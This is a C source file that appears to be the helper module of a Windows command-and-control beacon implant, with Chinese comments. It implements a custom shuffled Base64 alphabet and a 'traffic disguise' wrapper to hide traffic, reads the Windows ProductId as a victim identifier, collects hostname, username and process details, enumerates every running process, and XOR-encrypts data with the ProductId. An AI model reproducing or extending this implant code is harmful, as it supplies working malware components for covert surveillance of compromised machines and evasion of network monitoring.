#include "beacon.h"

// 标准Base64编码表定义
const char standard_base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// 自定义Base64编码表定义（打乱的）
#ifdef USE_CUSTOM_BASE64
const char base64_table[] = CUSTOM_BASE64_TABLE;
#else
const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
#endif

// Base64编码函数
void base64_encode(const unsigned char* input, size_t length, char** output) {
    if (!input || !output) return;

    size_t output_len = ((length + 2) / 3) * 4 + 1;
    *output = (char*)malloc(output_len);
    if (!*output) return;

    int i = 0, j = 0;
    unsigned char block[3];
    char* out = *output;

    while (length > 0) {
        if (length >= 3) {
            memcpy(block, input + i, 3);
            out[j] = base64_table[block[0] >> 2];
            out[j + 1] = base64_table[((block[0] & 0x03) << 4) | (block[1] >> 4)];
            out[j + 2] = base64_table[((block[1] & 0x0f) << 2) | (block[2] >> 6)];
            out[j + 3] = base64_table[block[2] & 0x3f];
            length -= 3;
            i += 3;
            j += 4;
        } else {
            block[0] = input[i];
            block[1] = (length > 1) ? input[i + 1] : 0;
            block[2] = 0;

            out[j] = base64_table[block[0] >> 2];
            out[j + 1] = base64_table[((block[0] & 0x03) << 4) | (block[1] >> 4)];
            out[j + 2] = (length > 1) ? base64_table[((block[1] & 0x0f) << 2)] : '=';
            out[j + 3] = '=';
            j += 4;
            break;
        }
    }
    out[j] = '\0';
}

// Base64解码函数
BEACON_ERROR base64_decode(const char* input, void** output, size_t* output_size) {
    if (!input || !output || !output_size) {
        return BEACON_ERROR_PARAMS;
    }

    size_t input_len = strlen(input);
    if (input_len == 0) {
        return BEACON_ERROR_PARAMS;
    }

    if (input_len % 4 != 0) {
        return BEACON_ERROR_PARAMS;
    }

    size_t padding = 0;
    if (input_len > 0) {
        if (input[input_len - 1] == '=') padding++;
        if (input[input_len - 2] == '=') padding++;
    }

    *output_size = (input_len / 4) * 3 - padding;

    *output = malloc(*output_size);
    if (!*output) {
        return BEACON_ERROR_MEMORY;
    }

    unsigned char* out = (unsigned char*)*output;
    size_t i = 0, j = 0;
    int val = 0;
    int shift = 18;

    while (i < input_len) {
        char c = input[i++];
        int digit = -1;

        // 在自定义编码表中查找字符位置
        if (c == '=') {
            digit = 0;
        } else {
            for (int k = 0; k < 64; k++) {
                if (base64_table[k] == c) {
                    digit = k;
                    break;
                }
            }
        }

        if (digit == -1) {
            free(*output);
            *output = NULL;
            return BEACON_ERROR_PARAMS;
        }

        val = (val << 6) | digit;
        shift -= 6;

        if (shift < 0) {
            if (j < *output_size) {
                out[j] = (val >> 16) & 0xFF;
                j++;
            }
            if (j < *output_size) {
                out[j] = (val >> 8) & 0xFF;
                j++;
            }
            if (j < *output_size) {
                out[j] = val & 0xFF;
                j++;
            }
            val = 0;
            shift = 18;
        }
    }
    
    return BEACON_SUCCESS;
}

// 使用流量伪装包装数据
char* wrap_data_with_disguise(const char* data) {
    if (!data) return NULL;

#if ENABLE_TRAFFIC_DISGUISE
    size_t prefix_len = strlen(TRAFFIC_PREFIX);
    size_t suffix_len = strlen(TRAFFIC_SUFFIX);
    size_t data_len = strlen(data);
    size_t total_len = prefix_len + data_len + suffix_len + 1;

    char* wrapped_data = (char*)malloc(total_len);
    if (!wrapped_data) return NULL;

    // 构造包装后的数据：前缀 + 数据 + 后缀
    strcpy_s(wrapped_data, total_len, TRAFFIC_PREFIX);
    strcat_s(wrapped_data, total_len, data);
    strcat_s(wrapped_data, total_len, TRAFFIC_SUFFIX);

    return wrapped_data;
#else
    // 如果未启用流量伪装，直接复制原数据
    size_t data_len = strlen(data);
    char* copied_data = (char*)malloc(data_len + 1);
    if (copied_data) {
        strcpy_s(copied_data, data_len + 1, data);
    }
    return copied_data;
#endif
}

// 移除流量伪装包装，恢复原始数据
char* unwrap_data_from_disguise(const char* wrapped_data) {
    if (!wrapped_data) return NULL;

#if ENABLE_TRAFFIC_DISGUISE
    size_t prefix_len = strlen(TRAFFIC_PREFIX);
    size_t suffix_len = strlen(TRAFFIC_SUFFIX);
    size_t wrapped_len = strlen(wrapped_data);

    // 检查数据长度是否足够包含前缀和后缀
    if (wrapped_len < prefix_len + suffix_len) {
        // 数据太短，直接复制原数据
        size_t data_len = strlen(wrapped_data);
        char* copied_data = (char*)malloc(data_len + 1);
        if (copied_data) {
            strcpy_s(copied_data, data_len + 1, wrapped_data);
        }
        return copied_data;
    }

    // 检查前缀
    if (strncmp(wrapped_data, TRAFFIC_PREFIX, prefix_len) != 0) {
        // 没有预期的前缀，直接复制原数据
        size_t data_len = strlen(wrapped_data);
        char* copied_data = (char*)malloc(data_len + 1);
        if (copied_data) {
            strcpy_s(copied_data, data_len + 1, wrapped_data);
        }
        return copied_data;
    }

    // 检查后缀
    const char* suffix_start = wrapped_data + wrapped_len - suffix_len;
    if (strncmp(suffix_start, TRAFFIC_SUFFIX, suffix_len) != 0) {
        // 没有预期的后缀，直接复制原数据
        size_t data_len = strlen(wrapped_data);
        char* copied_data = (char*)malloc(data_len + 1);
        if (copied_data) {
            strcpy_s(copied_data, data_len + 1, wrapped_data);
        }
        return copied_data;
    }

    // 提取中间的数据
    size_t data_len = wrapped_len - prefix_len - suffix_len;
    char* unwrapped_data = (char*)malloc(data_len + 1);
    if (!unwrapped_data) return NULL;

    strncpy_s(unwrapped_data, data_len + 1, wrapped_data + prefix_len, data_len);
    unwrapped_data[data_len] = '\0';

    return unwrapped_data;
#else
    // 如果未启用流量伪装，直接复制原数据
    size_t data_len = strlen(wrapped_data);
    char* copied_data = (char*)malloc(data_len + 1);
    if (copied_data) {
        strcpy_s(copied_data, data_len + 1, wrapped_data);
    }
    return copied_data;
#endif
}

// 获取系统UUID
BEACON_ERROR get_system_uuid(WCHAR* uuid) {
    if (!uuid) {
        return BEACON_ERROR_PARAMS;
    }

    HKEY hKey;
    WCHAR value[MAX_PATH] = { 0 };
    DWORD valueSize = sizeof(value);
    DWORD type = REG_SZ;

    // 打开注册表键
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, REG_PATH, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return BEACON_ERROR_SYSTEM;
    }

    // 读取ProductId
    if (RegQueryValueExW(hKey, L"ProductId", NULL, &type, (LPBYTE)value, &valueSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return BEACON_ERROR_SYSTEM;
    }

    RegCloseKey(hKey);

    // 复制ProductId到uuid
    wcscpy_s(uuid, UUID_LENGTH, value);
    return BEACON_SUCCESS;
}

// 收集系统信息
BEACON_ERROR collect_system_info(char** json_data) {
    if (!json_data) {
        return BEACON_ERROR_PARAMS;
    }

    WCHAR hostname[MAX_PATH] = { 0 };
    WCHAR username[MAX_PATH] = { 0 };
    WCHAR processPath[MAX_PATH] = { 0 };
    char processName[MAX_PATH] = { 0 };
    DWORD processId = 0;
    DWORD hostnameLen = MAX_PATH;
    DWORD usernameLen = MAX_PATH;

    // 获取主机名和用户名
    if (!GetComputerNameW(hostname, &hostnameLen) ||
        !GetUserNameW(username, &usernameLen)) {
        return BEACON_ERROR_SYSTEM;
    }

    // 获取进程ID
    processId = GetCurrentProcessId();

    // 获取进程路径
    DWORD pathLen = GetModuleFileNameW(NULL, processPath, MAX_PATH);
    if (pathLen == 0 || pathLen >= MAX_PATH) {
        return BEACON_ERROR_SYSTEM;
    }

    // 获取进程名
    WCHAR* name = wcsrchr(processPath, L'\\');
    if (name) {
        name++; // 跳过反斜杠
        WideCharToMultiByte(CP_UTF8, 0, name, -1, processName, MAX_PATH, NULL, NULL);
    } else {
        WideCharToMultiByte(CP_UTF8, 0, processPath, -1, processName, MAX_PATH, NULL, NULL);
    }

    // 转换宽字符到UTF-8
    char hostNameA[MAX_PATH] = { 0 };
    char userNameA[MAX_PATH] = { 0 };
    char processPathA[MAX_PATH * 4] = { 0 };
    char osUUIDA[UUID_LENGTH] = { 0 };

    // 使用UTF-8编码转换
    if (!WideCharToMultiByte(CP_UTF8, 0, hostname, -1, hostNameA, MAX_PATH, NULL, NULL) ||
        !WideCharToMultiByte(CP_UTF8, 0, username, -1, userNameA, MAX_PATH, NULL, NULL) ||
        !WideCharToMultiByte(CP_UTF8, 0, g_config.uuid, -1, osUUIDA, UUID_LENGTH, NULL, NULL)) {
        return BEACON_ERROR_SYSTEM;
    }

    // 特殊处理进程路径
    int pathResult = WideCharToMultiByte(CP_UTF8, 0, processPath, -1, processPathA, MAX_PATH * 4, NULL, NULL);
    if (pathResult == 0) {
        return BEACON_ERROR_SYSTEM;
    }

    // 转换反斜杠
    for (char* p = processPathA; *p; p++) {
        if (*p == '\\') {
            memmove(p + 1, p, strlen(p) + 1);
            *p++ = '\\';
        }
    }

    // 分配JSON缓冲区
    size_t json_size = 4096;
    *json_data = (char*)malloc(json_size);
    if (!*json_data) {
        return BEACON_ERROR_MEMORY;
    }

    // 构建JSON
    int written = _snprintf_s(*json_data, json_size, json_size - 1,
        "{"
        "\"hostname\":\"%s\","
        "\"username\":\"%s\","
        "\"process_name\":\"%s\","
        "\"process_path\":\"%s\","
        "\"process_id\":%d,"
        "\"arch\":\"x64\","
        "\"os_uuid\":\"%s\""
        "}",
        hostNameA, userNameA, processName, processPathA, processId, osUUIDA);

    if (written < 0 || written >= (int)(json_size - 1)) {
        free(*json_data);
        *json_data = NULL;
        return BEACON_ERROR_MEMORY;
    }

    return BEACON_SUCCESS;
}

// 获取进程列表
BEACON_ERROR get_process_list(char** json_data) {
    if (!json_data) {
        return BEACON_ERROR_PARAMS;
    }

    HANDLE hSnapshot;
    PROCESSENTRY32W pe32;
    size_t capacity = 1024 * 1024;
    size_t offset = 0;
    BOOL isFirst = TRUE;

    // 分配内存
    *json_data = (char*)malloc(capacity);
    if (!*json_data) {
        return BEACON_ERROR_MEMORY;
    }

    // 创建进程快照
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        free(*json_data);
        *json_data = NULL;
        return BEACON_ERROR_SYSTEM;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32W);
    
    // 开始JSON数组
    offset += _snprintf_s(*json_data + offset, capacity - offset, capacity - offset - 1,
        "{\n  \"processes\": [\n");

    // 遍历进程
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            // 检查缓冲区大小
            if (capacity - offset < 2048) {
                size_t new_capacity = capacity * 2;
                char* new_buffer = (char*)realloc(*json_data, new_capacity);
                if (!new_buffer) {
                    CloseHandle(hSnapshot);
                    free(*json_data);
                    *json_data = NULL;
                    return BEACON_ERROR_MEMORY;
                }
                *json_data = new_buffer;
                capacity = new_capacity;
            }

            // 获取进程路径
            WCHAR fullPath[MAX_PATH] = L"N/A";
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
            if (hProcess) {
                DWORD pathLen = MAX_PATH;
                if (!QueryFullProcessImageNameW(hProcess, 0, fullPath, &pathLen)) {
                    wcscpy_s(fullPath, MAX_PATH, pe32.szExeFile);
                }
                CloseHandle(hProcess);
            }

            // 转换到UTF-8
            char processName[MAX_PATH] = { 0 };
            char processPath[MAX_PATH * 2] = { 0 };
            WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, processName, MAX_PATH, NULL, NULL);
            WideCharToMultiByte(CP_UTF8, 0, fullPath, -1, processPath, MAX_PATH * 2, NULL, NULL);

            // 处理路径中的反斜杠
            for (char* p = processPath; *p; p++) {
                if (*p == '\\') {
                    memmove(p + 1, p, strlen(p) + 1);
                    *p++ = '\\';
                }
            }

            // 添加进程信息
            int written = _snprintf_s(*json_data + offset, capacity - offset, capacity - offset - 1,
                "%s    {\n"
                "      \"pid\": %lu,\n"
                "      \"name\": \"%s\",\n"
                "      \"path\": \"%s\"\n"
                "    }",
                isFirst ? "" : ",\n", pe32.th32ProcessID, processName, processPath);

            if (written < 0 || written >= (int)(capacity - offset)) {
                CloseHandle(hSnapshot);
                free(*json_data);
                *json_data = NULL;
                return BEACON_ERROR_MEMORY;
            }

            offset += written;
            isFirst = FALSE;

        } while (Process32NextW(hSnapshot, &pe32));
    }

    // 关闭JSON数组
    int written = _snprintf_s(*json_data + offset, capacity - offset, capacity - offset - 1, "\n  ]\n}");
    if (written < 0 || written >= (int)(capacity - offset)) {
        CloseHandle(hSnapshot);
        free(*json_data);
        *json_data = NULL;
        return BEACON_ERROR_MEMORY;
    }

    CloseHandle(hSnapshot);
    return BEACON_SUCCESS;
}

// 获取Windows ProductId
BEACON_ERROR get_product_id(char* product_id, size_t size) {
    HKEY hKey;
    DWORD type = REG_SZ;
    DWORD data_size = size;

    if (!product_id || size == 0) {
        return BEACON_ERROR_PARAMS;
    }

    // 打开注册表键
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, REG_PATH, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return BEACON_ERROR_SYSTEM;
    }

    // 读取ProductId
    if (RegQueryValueExW(hKey, L"ProductId", NULL, &type, (LPBYTE)product_id, &data_size) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return BEACON_ERROR_SYSTEM;
    }

    RegCloseKey(hKey);
    return BEACON_SUCCESS;
}

// 使用ProductId进行XOR加密/解密
void xor_encrypt_decrypt(unsigned char* data, size_t data_len, const char* key, size_t key_len) {
    if (!data || !key || data_len == 0 || key_len == 0) return;
    
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}
